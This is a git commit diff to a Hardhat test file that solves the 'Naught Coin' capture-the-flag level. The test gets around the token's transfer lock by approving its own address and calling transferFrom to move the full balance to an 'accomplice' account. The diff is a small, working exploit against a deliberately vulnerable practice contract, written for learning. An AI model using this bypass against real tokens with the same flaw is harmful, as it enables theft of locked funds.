b6d9c792cd86649909eed82736aa97187d681bd7
Rocky Murdoch <rockymurdoch.tech@gmail.com>
2024-01-20 12:27:16 +0200

    feat: Solve Naught Coin challenge

--- test/15-naught-coin.ts
+++ test/15-naught-coin.ts
@@ -1,25 +1,44 @@
 import { expect } from "chai";
 import { BigNumber, Contract, Signer } from "ethers";
 import { ethers } from "hardhat";
-import { createChallenge, submitLevel } from "./utils";
+import { TestOptions, setupChallenge, submitLevel } from "./utils";
 
-let eoa: Signer;
-let challenge: Contract; // challenge contract
-let attacker: Contract | undefined;
+describe("Naught Coin", () => {
+  let eoa: Signer;
+  let accomplice: Signer;
+  let challenge: Contract;
 
-before(async () => {
-  accounts = await ethers.getSigners();
-  [eoa] = accounts;
-  const challengeFactory = await ethers.getContractFactory("NaughtCoin");
-  const challengeAddress = await createChallenge(
-    "0x096bb5e93a204BfD701502EB6EF266a950217218"
-  );
-  challenge = await challengeFactory.attach(challengeAddress);
-});
+  before(async () => {
+    const contractLevel = "0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F";
+    const contractName = "NaughtCoin";
+    const options: TestOptions = { contractName };
+    ({ challenge } = await setupChallenge(contractLevel, options));
+    [eoa, accomplice] = await ethers.getSigners();
+  });
 
-it("solves the challenge", async () => {
-});
+  it("solves the challenge", async () => {
+    const [eoaAddress, accompliceAddress] = await Promise.all([
+      eoa.getAddress(),
+      accomplice.getAddress(),
+    ]);
+    const eoaBalance = await challenge.balanceOf(eoaAddress);
+    expect(eoaBalance.toString()).to.be.not.equal("0");
 
-after(async () => {
-  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
+    const tx1 = await challenge.approve(eoaAddress, eoaBalance);
+    await tx1.wait();
+
+    const tx2 = await challenge.transferFrom(
+      eoaAddress,
+      accompliceAddress,
+      eoaBalance
+    );
+    await tx2.wait();
+
+    const afterBalance = await challenge.balanceOf(eoaAddress);
+    expect(afterBalance.toString()).to.be.equal("0");
+  });
+
+  after(async () => {
+    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
+  });
 });
